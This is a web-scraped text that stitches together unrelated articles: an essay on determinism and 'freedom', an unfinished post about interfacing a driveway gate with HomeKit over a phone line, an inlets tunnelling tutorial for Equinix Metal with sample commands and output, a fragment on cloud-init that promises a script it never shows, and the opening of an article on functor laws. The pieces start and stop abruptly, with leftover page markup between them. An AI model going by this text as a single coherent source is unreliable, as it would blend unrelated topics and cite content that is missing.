        <p>A fraction of our behaviors are governed by patterns that, upon closer examination, reveal significant steps in personal development. This article is intended for those who wish to introspect and recognize their patterns as part of the necessary step to grow and prevent becoming an oppressor.</p>

<p>In common use, to believe oneself free is to deny the existence of the causes that explain one’s behavior. To say “I was free to go by the left or by the right” actually means “I don’t know the reasons that make me take one path rather than another”, the reasons exist, we just don’t know them<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. This is the principle of <a href="https://en.wikipedia.org/wiki/Causality_(physics)">causality</a>.</p>

<p>Those who believe they are free tend to believe that others are free for the same reasons. Believing that others act freely is then equivalent to denying the existence of causes in their actions. To say “this person is free to become an engineer or an artist” actually means “I don’t know why this person is in this career rather than another”.</p>

<h2 id="deny">Deny</h2>

<p>Denying the existence of causes is not an isolated problem and Etienne Klein illustrates this very well through a funny anecdote (video in French):</p>

<iframe src="https://www.youtube-nocookie.com/embed/Fj5r1ry2TTU?start=217" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<blockquote>
  <p>The other day […], I was giving a lecture at Central [Grande École in France] on relativity and I was doing the same calculation of Einstein’s 1905 calculation in which they show that the duration of a phenomenon depends on the speed of the observer in relation to this phenomenon […]. At the end of the demonstration a pupil asks to speak and says to everyone “Sir, I do not agree with Einstein”. I was happy, I had a student who had a critical mind, I ask him to argue. I was expecting him to talk about Poincaré who restores the luminiferous aether… in short, to argue. That he would argue from arguments that come from physics and the guy says “Sir I don’t believe the dilation of time because I don’t feel it”. In other words, this young man who was accepted in Centrale, <em>thought that his feeling, his subjectivity, had a power great enough to be able to discredit what a century of objectification has made it possible to establish</em>. - Etienne Klein</p>
</blockquote>

<p>In our case, it is not about physical phenomena but about human behavior. People denying (consciously or not) the deterministic character on which our behavior depends, oppose the theories that are more than a century old, such as the social determinism of Emile Durkeim for example. This attitude, in addition to being obsolete, is dangerous.</p>

<h2 id="dangers">Dangers</h2>

<p>Omitting the reasons for human behavior leads to difficult situations that are encountered in many different contexts:</p>
<ul>
  <li>A bad parent gets angry at its child without trying to understand the reasons for its child’s misbehavior. In fact, the child felt lonely throughout dinner and wanted to get someone’s attention.</li>
  <li>A bad manager blames an employee without trying to find the reasons for the delay. In fact, what was asked for in the first place didn’t make much sense when looking at it more closely and a redesign was required, making the delivery as late as necessary.</li>
  <li>A bad engineer denigrates the misuse of a system by a user without ever trying to meet the person. In fact, no user input control was implemented, leaving the system capable of harming itself.</li>
  <li>etc.</li>
</ul>

<p>Getting rid of the need to understand others generates a lot of frustration, especially if it involves a hierarchical relationship. If at the level of a team, “first accountability and then blame” is disastrous, imagine at the level of a nation.</p>

<blockquote>
  <p>Moreover, the frequency of torture is always a sign of faith or laziness in the Government. There is no evil that cannot be made good for something. Jean-Jacques Rousseau — Du contrat social (1762)</p>
</blockquote>

<h2 id="reasons">Reasons</h2>

<p>So where does this trend come from? There are many reasons. Etienne Klein explains it by laziness and narcissism: “I find that this relativism, when it is too strong, is a perfect legitimization of <em>intellectual laziness</em>, that you can judge what is going on in Nature from your subjectivity alone, sometimes even from your narcissism alone. It relieves you of having to learn a couple of things about quantum mechanics, particle physics or the Higgs boson”.</p>

<p>Confirmation bias or <em>conflict of interest</em> stem also that tendency. This is why, a manager of a team prefers to believe that another team is intrinsically incompetent rather than investing some of my resources in training them.</p>

<p>Last example: <em>who would boast of not being free?</em> It is even the first term of the French national motto “liberty, equality, fraternity”.</p>

<p>Although these reasons can be explained, they are no less dangerous. So what can be done?</p>

<h2 id="solution">Solution</h2>

<p>Recognize that <em>freedom is limited</em>. Don’t see this as a fatality; on the contrary, it is the essential point for growing up. Consider this as a constraint of the system you are designing, which hidden, cannot help to find the appropriate solution.</p>

<p>Once acknowledged, areas for improvement will come naturally. Some disciplines such as UX design have understood this early on. A designer will adjust the interface if many users interact in unexpected ways. User behaviors prevail over the designer’s wishes or predictions. Thanks to the trends in human behavior that UX has been able to establish principles, evaluate them, refine them, etc.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Are we free? Should we fight for our freedom? This article does not pretend to answer these questions. On the other hand, a fraction of our behaviors seem to be governed by patterns that, if we take the time to look into them, reveal actionable steps for personal development. Denying these patterns and neglecting the need to understand them is a lost opportunity to improve and may turn into oppression.</p>

<p>Assuming our behavior as the result of an unpredictable phenomenon is firstly a sign of narcissism, but above all a denial of the ability to introspect, to recognize our patterns, to understand ourselves, in other words, to grow. Expanding that idea to others is dangerous. Considering the behavior of others as absolutely unforeseeable is first naive toward the social sciences, but it is above all to rid ourselves of the responsibility to understand, to empathize, in fact to free the other. <a href="https://twitter.com/arnaud_debec/status/1332434506112970753">So acknowledge you live in a cage before planning to escape</a>.</p>

        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <h2 id="overview">Overview</h2>

<p>Over the past 8 weeks, I built a HomeKit accessory to open and close the gate at the end of my driveway.  The project was really fun, and this document outlines the process of creating it, from concept to working prototype.</p>

<h3 id="additional-background">Additional Background</h3>

<p>Programming examples for microcontrollers will be in C++.  For the most part, we’ll be sticking essentially to “C with Classes”, which is typical of most Arduino and other microcontroller projects.</p>

<p>The data in this document is by no means meant to be comprehensive.  I am not an electrical engineer, and welcome any corrections or other feedback.  Where possible, I’ve cited references or resources I found useful at each step.  For the most part, extensive googling served as the primary research tool.</p>

<p>The swing gate in question is a Sentex Crown Jewel, which was available in the early 2000s. It interfaces with a home phone system to control 1 or 2 relays.  Programming is performed either via the gate keypad, or via 300 baud modem connected to a Windows program.  Later in this document we’ll show how to use a listening modem to eavesdrop on the communication to reverse engineer the app-only commands which are not in the publicly available references.</p>

<p>Further data for those interested can be found</p>
<ul>
  <li><a href="https://p.widencdn.net/51eik7/6001141">Crown Jewel Programming manual</a></li>
  <li><a href="https://p.widencdn.net/np06ng/6001145">Crown Jewel Installation manual</a></li>
</ul>

<h2 id="concept">Concept</h2>

<p>The problem I aimed to solve was to interface the gate microcontroller to HomeKit.  The only interfaces to the gate are a keypad (outside the gate) and a home phone line.  The previous owners did not install the manual operation switch, so I would frequently forget to open the gate when walking into town, get to the gate, then go back inside to dial the phone access code.  It would be great to just pull out a phone or say “hey Siri open the gate”.</p>

<p>First thing to do is to decompose the goal into tasks small enough that each can have easily understandable requirements and success criteria.  Another benefit of this process is that having many small tasks to complete will give us a sense of accomplishment and provide motivation as we complete them 🙂</p>

<h3 id="problem-1---phone-interface-to-swing-gate">Problem 1 - Phone Interface to Swing Gate</h3>

<p>Objective: Implement software library that can send and receive phone number tones, and communicate with a 300 baud modem.</p>

<p>Success Criteria:</p>

<ul>
  <li>Detect when phone is off hook, and listen for DTMF tones to keep HomeKit state in sync when other users control the gate from the phone line.</li>
  <li>Take phone off hook and dial numbers to control gate relay.</li>
  <li>Communicate via 300 baud modem (Bell 103) protocol.</li>
</ul>

<h3 id="problem-2---homekit-support">Problem 2 - HomeKit Support</h3>

<p>Objective: The microcontroller + phone line interface should appear as a home kit accessory.</p>

<p>Success Criteria:</p>

<ul>
  <li>Successfully pair the device with HomeKit</li>
  <li>Implement a service that  allows opening and closing the gate</li>
  <li>Demonstrate control via “Hey Siri open the gate”</li>
</ul>

<h3 id="problem-3---physical-prototype">Problem 3 - Physical prototype</h3>

<p>Objective: Combine the proofs of concept of the phone interface, and homekit device, into a single logic board, have that board manufactured, and enclose it in a case.</p>

<p>Success Criteria:</p>

<ul>
  <li>Capture a schematic which contains all necessary circuits for correct operation of the system.</li>
  <li>Arrange the physical design of those components and signals into a printed circuit board using a CAD program.</li>
  <li>Manufacture the board.</li>
  <li>Enclose the assembled board in a case so we can handle it safely and easily.</li>
</ul>

<h2 id="phone-interface-to-swing-gate">Phone Interface to Swing Gate</h2>

<p>The first piece of the project is the phone line interface.  Reviewing the requirements from earlier, our first requirement is “Detect when phone is off hook, and listen for DTMF tones”.</p>

<p>Decomposing this further, we need to:</p>

<ul>
  <li>Understand how to interface a microcontroller to a phone line</li>
  <li>Understand how to take the phone “off hook”</li>
  <li>Do some signal processing to detect tones, for example, someone pressing the number “9” on a phone keypad.</li>
</ul>

<h3 id="digital-access-arrangement">Digital Access Arrangement</h3>

<p>In the United States, home phone lines usually consist of a pair of wires, Tip and Ring, with a nominal -48VDC between them.  These wires carry the signal (voice or data), and the voltage and resistance between them indicates various states (on hook, off hook, ringing, etc.) <a href="https://en.wikipedia.org/wiki/Plain_old_telephone_service" title="Wikipedia Plain Old Telephone Service">Additional info at Wikipedia</a>.</p>

<p>Since the voltage on the lines (48v) is well above that typically interfaced to a microcontroller (1.8-5.0v), we need some circuitry to extract the signal from the phone line, convert it to a voltage compatible with our processor.  Additionally, this circuitry should provide isolation of our circuitry from the phone circuit, to protect against transient voltage spikes.  A nice discussion of isolation is <a href="https://www.silabs.com/documents/public/application-notes/AN1167.pdf" title="Safety Considerations for Silicon Labs Series Capacitor Isolators">here</a>.  In this application we’ve chosen to use a surge suppression capacitor that will fail open but magnetic isolation via a small transformer is also common in modem designs.</p>

<p>Since there are quite a few components in even simplified / cost reduced DAA’s (see page 21, &lt;&gt;) I opted to buy a reference board for the <a href="https://ixysic.com/Products/LITELINK.htm">Ixys CPC5622 Litelink III DAA</a>. Additional info can be found in the <a href="https://www.ixysic.com/home/pdfs.nsf/www/UG-LLIII-EB.pdf/$file/UG-LLIII-EB.pdf">CPC5622-EVAL Evaluation Board Users Guide</a>.</p>

<h3 id="integration-with-arduino-uno">Integration With Arduino Uno</h3>

<p>Connecting the Eval board for the Litelink DAA to the Arduino so that we can start looking at phone line signals is pretty straight forward.  Looking at the Fritzing diagram below, we’ve connected an I2C oled to the Uno so we can see what’s happening.  The eval board implements DC-blocking capacitors on the TX/RX lines, so we implement a voltage divider with a pair of resistors, and connect the RX line (pink) from the 5622 to A0 on the Uno, putting the “zero point” at 1.65V (3.3/2).  We wire up a phone jack to the J1 header on the eval board, and we connect 3.3v through a 10k resistor to AREF on the Uno, setting the analog reference for ADC measurements at 3.3 * 32/(32+10) == 2.5v.  Since the Uno doesn’t have a differential ADC, the Vpp (peak to peak voltage) on the RX+ line from the eval board should be &lt;1V so we shouldn’t clip under normal operation, and get more precision out of the ADC by using more of its range vs. the standard 0-5V.  “Off Hook” (orange) is pulled up as required by the 5622.</p>

<p><img src="https://sampo3k.github.io/images/fritzing.jpg" alt="5622EVAL Fritzing"></p>

<p>Success!  At this point, we can read A0, and see the voltage held roughly constant at 1.65v when on hook, and if you pick up a receiver on the phone line connected to the 5622, you will start seeing the voltage vary as the call progress (dial) tone is received, or connect an oscilloscope and visualize it.</p>
<h3 id="digital-signal-processing">Digital Signal Processing</h3>

<p>Now we have an analog signal into our Uno, and can move on to the next requirement: decode DTMF tones. <a href="https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling" title="Link to Wikipedia article on DTMF">Dual-tone multi-frequency</a> (DTMF) is way each key on a phone key pad is converted into analog signals.  The wikipedia article does a really good job summarizing what’s going on.</p>

<p>At this point we need to do some Digital Signal Processing (DSP) to figure out which frequencies are present in the signal we’re receiving, and then see if there are exactly two strong signals that happen to be one of the 16 DTMF pairs.</p>

<p>I’m not going to go too deeply into DSP here, but for a better understanding of what we’re trying to do, I cannot recommend these two resources highly enough.</p>

<ol>
  <li>
    <p><a href="https://jackschaedler.github.io/circles-sines-signals/">Intro to DSP</a>: This website has amazing interactive tutorials that explains some of the fundamentals of digital signal processing in a really neat and useful way.</p>
  </li>
  <li>
    <p><a href="http://www.dspguide.com/">DSP book</a>: This book is a wealth of information on DSP techniques, and the PDFs of each chapter are available for free.  With some effort, you can even concatenate them together into the entire book :)</p>
  </li>
</ol>

<h3 id="tone-detection">Tone Detection</h3>

<p>For DTMF, the typical sequence we are looking for is &gt;=100ms of tone and &gt;=100ms of silence repeated for however many digits we are listening for.</p>

<p>The common approach to frequency detection is an FFT.  However, the performance of the 16MHz ATMega328P makes this difficult.  For example, we need the FFT bins about 70Hz apart or less to discriminate the DTMF tones.  So that means at 8KHz we need roughly  8000/70 = 114 samples or more.  Rounding up to a convenient power of 2 for the FFT, we’ll say 256/2 = 128 FFT bins. The bins will be 8KHz / 128 = 62.5Hz apart.</p>

<p>To do a 256 sample FFT, in addition to a reasonable amount of memory, we’d need something on the order of ~8k multiplies and ~8k additions, which given the performance of 16x16+32 MAC is around 50 cycles, our most wildly optimistic projection here if we hand coded a great FFT is like 25-30ms, or about 0.5x realtime. This seems to line up well with the results on this <a href="https://www.norwegiancreations.com/2019/03/arduino-fft-pt-2-improving-the-hardware-for-real-time-analysis/" title="Arduino FFT pt. 2: Improving the Hardware for Real-time Analysis">Arduino FFT post</a>. We also use the same performance hack noted there to reduce the ADC prescaler on the ATMega328 so that ADC reads don’t take so long.</p>

<p>An alternative approach is to use <a href="https://en.wikipedia.org/wiki/Goertzel_algorithm">Goertzel algorithm</a> which is essentially a single-frequency digital filter.  Doing 8 applications of the Goertzel algorithm including the ADC reads only takes about 12ms, which is about 1.2x realtime.  I think, based on the output of <a href="https://godbolt.org/">https://godbolt.org</a> that AVR GCC is generating full 32x32 multiplies for 16x16+32 -&gt; 32 MAC so some hand assembly could probably make this go faster.</p>

<p>In order to generate some test cases for our code, I used this <a href="https://www.audiocheck.net/audiocheck_dtmf.php">DTMF WAV file generator</a> and converted the resulting WAV files into virtual ADC samples in the range of our analog circuit.  I then ran our detection code, to verify the algorithm correctness before moving it to the Uno.  A reasonable sample Goertzel implementation can be found <a href="https://www.st.com/resource/en/design_tip/dm00446805-the-goertzel-algorithm-to-compute-individual-terms-of-the-discrete-fourier-transform-dft-stmicroelectronics.pdf" title="The Goertzel algorithm to compute individual terms of the discrete Fourier transform (DFT)">here</a></p>

<h3 id="bell-103">Bell 103</h3>

<p>Programming the gate microcontroller is done via the 300 baud modem protocol <a href="https://en.wikipedia.org/wiki/Bell_103_modem">Bell 103</a>.  The RX side of this seems well within the Uno’s capabilities, as we can likely count the number of zero crossings in every 3ms baud window to discriminate between the mark and space frequencies used by the <a href="http://edge.rit.edu/content/P09141/public/FSK.pdf">FSK</a> encoding.</p>

<p>The TX side however, seems much trickier on the Uno.  The Uno lacks a DAC, and while you can create one using PWM on a digital pin and then put it through a low pass filter, this seemed like a lot of work.  About this time I also wanted to get going on HomeKit portion of the project, and I took the easy way out: using an actual modem.</p>

            <p>Inlets was created to make tunnelling easy for Cloud Native practitioners. Learn three ways to deploy tunnels to Equinix Metal from your private network or Kubernetes clusters.</p>

<h2 id="introduction">Introduction</h2>

<p>From early on I’d played with SSH tunnels and Ngrok, and run into their various limitations from being completely blocked at enterprise companies, to the challenges of automating a technology <a href="https://en.wikipedia.org/wiki/OpenSSH">first released 20 years ago</a>. In 2019, <a href="https://blog.alexellis.io/2019-my-year-in-review-inlets/">Inlets was just supposed to be a Proof of Concept</a>, to tunnel services without the legacy of prior art, or the limitations of a SaaS product. It was built to be run without rate-limiting, and to run over a web-socket so that it could be used with corporate HTTP proxies. It was built to run in containers, VMs, Kubernetes clusters, Raspberry Pis. It was built for Cloud Native practitioners like myself.</p>

<p>After the initial set of early-adopters came, new users arrived who expected to just run one command and have everything set up. The tool was easy to use, but required hosts to be set up to act as gateways or “exit-servers.” The exit-server is public-facing and loans its public IPv4 and IPv6 address to the other end of the tunnel, which runs inside a private network.</p>

<p>That’s how the <a href="https://github.com/inlets/inletsctl">inletsctl</a> and <a href="https://github.com/inlets/inlets-operator">inlets-operator</a> projects came about. The idea was that they would provision the cheapest host available as quickly as possible to give a SaaS-like experience, but without the artificial limits put in place.</p>

<blockquote>
  <p>A Very early demo of inlets-operator from 2019 running on Equinix Metal (née Packet).</p>
</blockquote>

<p>At the time, I picked Equinix Metal for the first provider because they had an easy to use API, very high performance hosts on offer, and had a history of being good citizens in the Open Source community.</p>

<ul>
  <li><a href="https://github.com/inlets/inletsctl">inletsctl</a> creates an exit-server and prints out a command you can just run to connect a tunnel using <code>inlets client</code></li>
  <li><a href="https://github.com/inlets/inlets-operator">inlets-operator</a> integrates into Kubernetes (something which Ngrok didn’t offer at the time) and provides a LoadBalancer integration using the same approach</li>
</ul>

<p>The previous <code>--provider=packet</code> provider name will be phased out in newer versions of the above tools, and users should move over to the new Equinix Metal name: <code>--provider=equinix-metal</code>. All the options, flags, and regions are the same.</p>

<center><img src="https://inlets.dev/images/2020-12-equinix-metal/equinix-metal.svg" alt="Equinix Metal logo" width="30%"></center>

<p>Let’s look at three options for how to deploy inlets to Equinix Metal, for reliable, bare-metal performance.</p>



<p>Let’s say you’re working on an API or web-page, and need to share it with a friend or colleague. Perhaps it’s a draft blog post, an OpenFaaS function, or you actually need a webhook from Stripe for the SaaS business you’re building?</p>

<ul>
  <li>Create an API key for your Equinix Metal account and save it as ~/EM_API.txt</li>
  <li>Save your Project ID as ~/EM_PROJECT_ID.txt</li>
</ul>

<div><div><pre><code>inletsctl create <span>--provider</span> equinix-metal <span>\</span>
  <span>--region</span> ams1 <span>\</span>
  <span>--access-token-file</span> ~/EM_API.txt <span>\</span>
  <span>--project-id</span> <span>$(</span><span>cat</span> ~/EM_PROJECT_ID.txt<span>)</span>
</code></pre></div></div>

<p>In a few moments you’ll find a *t1.small.x86` provisioned in your account which costs $0.07 / hour. That is Equinix Metal’s cheapest host, at the end of the tutorial I’ll show you how you can use the inlets PRO chart to setup multiple tunnels on the same host for efficiency and cost savings. Other options like VPS providers will cost around 5 USD / month in total.</p>

<div><div><pre><code>inlets OSS <span>(</span>2.7.4<span>)</span> exit-server summary:
  IP: 147.75.33.129
  Auth-token: 6KGTlWVeI0FUgGybXT7dujWW4wT8G5chqDBPWLYJ16CiEbbrxkcIhMab4lV1BFcT

Command:
  <span>export </span><span>UPSTREAM</span><span>=</span>http://127.0.0.1:8000
  inlets client <span>--remote</span> <span>"ws://147.75.33.129:8080"</span> <span>\</span>
        <span>--token</span> <span>"6KGTlWVeI0FUgGybXT7dujWW4wT8G5chqDBPWLYJ16CiEbbrxkcIhMab4lV1BFcT"</span> <span>\</span>
        <span>--upstream</span> <span>$UPSTREAM</span>

To Delete:
        inletsctl delete <span>--provider</span> equinix-metal <span>--id</span> <span>"d47743d1-7f90-446c-aa65-472878e9f119"</span>
</code></pre></div></div>

<p>You’ll also get a connection string on your local machine which you can use to connect the tunnel.</p>

<p>If you’re exposing what’s running directly on your local machine then edit the port in <code>UPSTREAM</code>. If you were exposing Express.js, then you’d want port 3000 as per below:</p>

<div><div><pre><code>export UPSTREAM=http://127.0.0.1:3000
</code></pre></div></div>

<p>Then run the <code>inlets client</code> command and access your service from the public IP on port 80, i.e. <code>http://147.75.33.129/</code></p>

<p>You can also tunnel TCP services with inlets PRO <a href="https://docs.inlets.dev/#/get-started/quickstart-tcp-ssh">like SSH</a> and <a href="https://docs.inlets.dev/#/get-started/quickstart-tcp-database">Postgresql</a>.</p>

<h3 id="option-2---expose-a-service-from-your-kubernetes-cluster">Option 2 - expose a service from your Kubernetes cluster</h3>

<p>Whether you’re using a Raspberry Pi with k3s, or a cluster on your local computer with KinD, minikube, microk8s, or k3d, you can get a public endpoint within a few moments.</p>

<p>The easiest way to install the inlets-operator is with helm or <a href="https://github.com/alexellis/arkade">arkade</a>. arkade is a portable Kubernetes marketplace that makes it easy to install charts and CLIs.</p>

<div><div><pre><code>arkade <span>install </span>inlets-operator <span>\</span>
  <span>--provider</span> equinix-metal <span>\</span>
  <span>--region</span> ams1 <span>\</span>
  <span>--token-file</span> ~/EM_API.txt <span>\</span>
  <span>--project-id</span> <span>$(</span><span>cat</span> ~/EM_PROJECT_ID.txt<span>)</span>
</code></pre></div></div>

<p>Do you notice how the flags are almost a direct match for inletsctl? That’s intentional, to make inlets easy to use and consistent between workflows.</p>

<p>Now when the inlets-operator is installed, it will print a help message with a sample deployment which you can expose. You can get this message back at any time with `arkade info inlets-operator.</p>

<div><div><pre><code>kubectl run nginx-1 <span>--image</span><span>=</span>nginx <span>--port</span><span>=</span>80 <span>--restart</span><span>=</span>Always
kubectl apply <span>-f</span> <span>\</span>
 https://raw.githubusercontent.com/inlets/inlets-operator/master/contrib/nginx-sample-deployment.yaml
kubectl expose deployment nginx-1 <span>--port</span><span>=</span>80 <span>--type</span><span>=</span>LoadBalancer
</code></pre></div></div>

<p>The operator will automatically create the exit-server for you, and then run an <code>inlets client</code> as a Deployment within your cluster. Whenever the public server receives a request, it will tunnel it to the ClusterIP of the <code>nginx-1</code> service.</p>

<p>You can get the public IP address from your service, and you can find more information using the Tunnel CustomResource:</p>

<div><div><pre><code>kubectl get svc nginx-1 <span>-o</span> wide
kubectl get svc nginx-1 <span>-o</span> wide <span>-w</span>
NAME      TYPE           CLUSTER-IP     EXTERNAL-IP   PORT<span>(</span>S<span>)</span>        AGE     SELECTOR
nginx-1   LoadBalancer   10.43.176.39   &lt;pending&gt;     80:30297/TCP   2m53s   <span>app</span><span>=</span>nginx
nginx-1   LoadBalancer   10.43.176.39   147.75.33.201   80:30297/TCP   3m3s    <span>app</span><span>=</span>nginx

kubectl get tunnel/nginx-1-tunnel
NAME             SERVICE   TUNNEL   HOSTSTATUS   HOSTIP          HOSTID
nginx-1-tunnel   nginx-1                 
nginx-1-tunnel   nginx-1            active       147.75.33.201   874176b8-c1e2-47f7-a614-d4ff9a1b0f11
</code></pre></div></div>

<p>Then you can access your nginx-1 service from the public Internet as if it were running locally:</p>

<div><div><pre><code>curl <span>-s</span> http://147.75.33.201 | <span>grep </span>success
&lt;p&gt;If you see this page, the nginx web server is successfully installed and
</code></pre></div></div>

<p>To remove the exit-server, simply delete the service:</p>

<div><div><pre><code>kubectl delete svc/nginx-1
</code></pre></div></div>

<p>The inlets-operator also supports <a href="https://inlets.dev/">inlets PRO</a> which can be used to expose TCP services like an IngressController’s port 80 and 443 to make it fully functional and to receive TLS certificates. Another popular use-case is to expose a database, or SSH over the Internet.</p>

<h3 id="option-3---using-a-kubernetes-cluster-and-pods-for-exit-servers">Option 3 - using a Kubernetes cluster and Pods for exit-servers</h3>

<p>You can also use a Kubernetes cluster for exit-servers, running as Pods. This saves on money and is more efficient when you have many different clients needing tunnels. It also allows you to choose whether you want to expose services or keep them private within the public cluster.</p>

<p>The helm chart for inlets-pro has a client and server portion, if you deploy the server chart, you can do that any number of times, once for each service you want to tunnel in.</p>

<p>In the example below <a href="https://vshn.ch/en/">VSHN.ch</a> provides a SaaS OpenShift service to regulated institutions through the use of inlets run as a Pod.</p>

<p><img src="https://inlets.dev/images/2020-10-advanced-cloud/use-case-1-saas.png" alt="inlets PRO run as a chart"></p>
<blockquote>
  <p>This is useful for running a SaaS and connecting to customers, or for managing many clients.</p>
</blockquote>

<p>If a Pod fails, or a Node goes down, then Kubernetes will restart it automatically.</p>

<p>See also: <a href="https://github.com/inlets/inlets-pro/tree/master/chart/inlets-pro">inlets PRO server chart</a></p>

<h2 id="summing-up">Summing up</h2>

<p>I wanted to show you how easy it is to use Equinix Metal to set up a tunnel for development from your network, or from a Kubernetes cluster. All of these tunnels are using the inlets OSS project, which by default enables a single port to be exposed, TLS can be configured separately.</p>

<p>Alternatively you can use <a href="https://inlets.dev/">inlets PRO</a> which allows for tunnelling TCP services like databases and IngressControllers, multiple-ports, enables encryption by default and has commercial support. inlets PRO also enables a reverse proxy like Caddy, Nginx, or a Kubernetes IngressController to be exposed so that you can obtain TLS certificates from LetsEncrypt and serve as many virtual hosts as you like.</p>

<p>Whether you use inlets OSS or inlets PRO - the inletsctl/inlets-operator tooling is open source and gives the same consistent user-experience. To date we have provisioners for several clouds such as digitalocean, equinix-metal, ec2, scaleway, civo, gce, azure, linode and hetzner. You can suggest new provisioners and <a href="https://github.com/inlets/inletsctl/tree/master/pkg/provision">see the source code here</a>.</p>

<p>Find out more about inlets and use-cases in the <a href="https://docs.inlets.dev/">inlets docs</a></p>

<h3 id="going-further---hybrid-cloud-use-cases-and-replacing-a-vpn">Going further - hybrid-cloud use-cases and replacing a VPN</h3>

<p>Whilst inlets was created with the original problem of exposing an internal or private service, it’s since developed to offer an easier and more scalable alternative to a VPN. You can read more about how to use inlets for hybrid cloud in this post: <a href="https://inlets.dev/blog/2020/11/06/hybrid-cloud-with-inlets.html">Connect your on-premises databases to Kubernetes in the cloud</a>.</p>

It explains nitty gritty details about disk layouts and the cloud-init boot process. Read further if you want to customize your Kubernetes nodes or make the best of your cloud provider.</p><p>The Ubuntu 18.04.5 LTS Cloud Image is 361MB. To minimize VM creation time, said image is actually a snapshot of a ready-to-boot disk. This is unlike a USB/ISO image — commonly used for installing Ubuntu on laptops — which sets up the disk and copies files over. So if the cloud image is a ready-to-boot disk, how come you can use the full disk size after booting? How does a 361MB disk image “become” a 10GB disk? Where does all that magic happen?</p></div></div></div></div></div></div></div></div></section><section data-id="308306e" data-element_type="section"></section><section data-id="8bb6a1f" data-element_type="section"><div><div><div data-id="a7ba9de" data-element_type="column"><div><div><div data-id="78cc30a" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>Let us briefly go over the process of booting an Operating System on bare metal. The firmware (a.k.a. BIOS or UEFI) will search for a suitable disk. Said disk will contain a system partition (roughly “/boot”) which contains the bootloader and kernel images. As expected, the <a href="https://en.wikipedia.org/wiki/EFI_system_partition">system partition</a> needs to be formatted using a filesystem that is understood both by UEFI and bootloader, generally FAT32. Operating system configuration, including hostname, users, passwords, SSH authorized_keys, various daemon configurations, are all stored on the disk itself.</p><p>A VM boots similarly, with the hypervisor taking the role of the UEFI. However, to allow VMs to boot from a disk template, usually called cloud image, they need to take configuration parameters from the cloud provider, instead of having them hard-coded in the cloud image. For example, the VM learns its hostname from the so-called VM meta-data. This information is under the control of the cloud provider and can’t be changed by the cloud user. Other configurations, including root password, SSH authorized_keys, are configured by the cloud user and transmitted by the cloud provider to the VM via user-data. Implementation-wise, these two are merely two text files — actually called meta-data and user-data — packaged in an ISO-format file. Yes, the same ISO-format that was used for Compact Disks (CDs). Funny enough, said ISO file is actually exposed to the VM as a virtual CD-ROM.</p></div></div></div></div></div></div></div></div></section><section data-id="4118078" data-element_type="section"><div><div><div data-id="d43758d" data-element_type="column"><div><div><div data-id="d3c9b48" data-element_type="widget" data-widget_type="heading.default"><p><h2>Enough English, show me some code.</h2></p></div></div></div></div></div></div></section><section data-id="fa82500" data-element_type="section"><div><div><div data-id="853c43f" data-element_type="column"><div><div><div data-id="e859b92" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>To get started, install wget, qemu-img, genisoimage and kvm.

Since VMs are likely to share parts of the disk, a copy-on-write strategy only stores the differences between the VMs’ disks, and is likely to save physical disk space. The script then writes meta-data and user-data, and packs them into an ISO format file using genisoimage. Finally, the hypervisor — KVM/qemu in this example — is instructed to boot a VM which is wired to the virtual disk and a virtual CDROM containing its configuration.</p><p>Go ahead and play with the script yourself!

December 8, 2020 | https://functional.christmas/2020/8 | <a href="https://web.archive.org/web/*/https://functional.christmas/2020/8">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Last year I wrote <a href="https://functional.christmas/2019/20">an article</a> explaining functors in simple terms and show why they are useful. It has well received, but some felt it was lacking in details which is true and by design. There is more to be said and some crucial details that I glossed over so I will try to address some of them now. Let’s get nerdy!</p>
</section><article><section><h2>Functor as a context</h2>
<p>In the previous article I said you could think of a functor as a structure or container that has a mapping function. This is not strictly wrong as it is one way of thinking about the concept, but can be a bit misleading and confusing as it does not fit all situations. For example a functions can in some cases be a functor. A structure might give us thoughts about data structures or types. Container is fitting when talking about lists or other types that can contain data. Is a function a structure or container? For this reason it is common to refer to some of the general concepts and abstractions we use in FP (functor, monad etc.) as contexts which has some properties.</p>
<h2>The functor laws</h2>
<p>Unlike my vague explanation in the previous article a functor is actually a very specific thing, and is defined by rules or properties the context has to adhere to. These laws come from mathematics, specifically a branch called Category Theory. This is an area that I will not claim much knowledge of but great minds have found similarities between this particular part of mathematics and what we do in programming. </p>
<p>In addition to having the <code>map</code> function, functors needs to follow some rules.
The rules for functors are often called the functor laws. I'm not completely sure why. It might have something to do with math and also its sounds very sophisticated. :P Let’s get in on the sophistication!</p>
<h3>1. Law of preservation of identity</h3>
<p>The first law or rule of functors is that if the <code>map</code> function is given the identity function as its mapping function it will return the same functor.
The identity function is just a function that has one argument which it returns right back (<code>\x -&gt; x</code> in Elm or <code>function(x){return x;}</code> in JS).</p>
<p>Let’s use lists to visualize this a bit more. Elm actually has the identity function in its standard library so we will just use that one:</p>
<div data-language="elm"><pre><code><span>List.map</span> <span>identity</span> <span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>]</span> <span>==</span> <span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>]</span></code></pre></div>
<p>For the javascript example we will add the identify function inline:</p>
<div data-language="javascript"><pre><code><span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>]</span><span>.</span><span>map</span><span>(</span><span>(</span><span>x</span><span>)</span> <span>=&gt;</span> x<span>)</span> <span>==</span> <span>[</span><span>1</span><span>,</span><span>2</span><span>,</span><span>3</span><span>,</span><span>4</span><span>]</span></code></pre></div>
<p>When following this law the functor can not make any weird changes to the result. <code>List.map someFunction [1,2,3,4]</code> can never return an empty list. It can only map the function over the values. When mapping over a 4 item list, the returning list will always be a 4 item list. </p>
<h3>2. Law of composition</h3>
<p>The second law is not very complicated either but assumes that you know about composition. Lets quickly go through composition before looking at the next law.</p>
<h4>Composition</h4>
<p>Composition in functional programming (FP) is the ability to compose multiple functions into one single function. This is not often used in object oriented programming (OOP) but quite common in FP. </p>
